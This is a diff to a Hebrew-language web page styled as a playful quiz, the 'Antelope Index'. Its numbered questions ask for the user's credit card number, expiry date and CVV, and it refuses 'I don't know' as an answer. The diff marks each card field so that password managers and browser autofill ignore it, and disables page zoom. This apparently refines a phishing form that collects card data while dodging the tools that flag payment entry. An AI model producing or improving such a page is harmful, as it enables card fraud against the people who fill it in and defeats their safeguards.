@@ -3,8 +3,10 @@
 <html lang="he" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>מדד האנטילופה</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Secular+One&family=Heebo:wght@300;400;500;700;900&display=swap" rel="stylesheet">
 <style>
 *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -283,7 +285,7 @@ border: 2px solid #e8d080;
 border-radius: 14px;
 padding: 16px 18px;
 font-family: ‘Heebo’, sans-serif;
-font-size: 18px;
+font-size: 16px;
 color: var(–text);
 direction: ltr;
 text-align: center;
@@ -669,7 +671,7 @@ color: var(–orange);
     <span class="question-num">1</span>
     מהם הפרטים שרשומים על כרטיס האשראי שלך?
   </div>
-  <input type="tel" id="cardNumber" placeholder="0000  0000  0000  0000" maxlength="19" oninput="formatCard(this)">
+  <input type="tel" id="cardNumber" autocomplete="off" data-lpignore="true" data-form-type="other" placeholder="0000  0000  0000  0000" maxlength="19" oninput="formatCard(this)">
   <div class="input-hint">הקלד את המספר הארוך שבחזית הכרטיס</div>
   <button class="next-btn" onclick="goNext(2)">המשך ←</button>
 </div>
@@ -680,7 +682,7 @@ color: var(–orange);
     <span class="question-num">2</span>
     מה התוקף?
   </div>
-  <input type="tel" id="expiry" placeholder="MM / YY" maxlength="5" oninput="formatExpiry(this)">
+  <input type="tel" id="expiry" autocomplete="off" data-lpignore="true" data-form-type="other" placeholder="MM / YY" maxlength="5" oninput="formatExpiry(this)">
   <div class="input-hint">שתי ספרות לחודש, שתיים לשנה</div>
   <button class="next-btn" onclick="goNext(3)">המשך ←</button>
 </div>
@@ -691,7 +693,7 @@ color: var(–orange);
     <span class="question-num">3</span>
     אם היו לך 3 ספרות בגב הכרטיס — מה הם היו?
   </div>
-  <input type="tel" id="cvv" placeholder="• • •" maxlength="3" oninput="this.value=this.value.replace(/\D/g,'')">
+  <input type="tel" id="cvv" autocomplete="off" data-lpignore="true" data-form-type="other" placeholder="• • •" maxlength="3" oninput="this.value=this.value.replace(/\D/g,'')">
   <div class="input-hint">בין היתר, תשובת ״לא יודע״ לא תתקבל</div>
   <button class="next-btn" onclick="goNext(4)">המשך ←</button>
 </div>
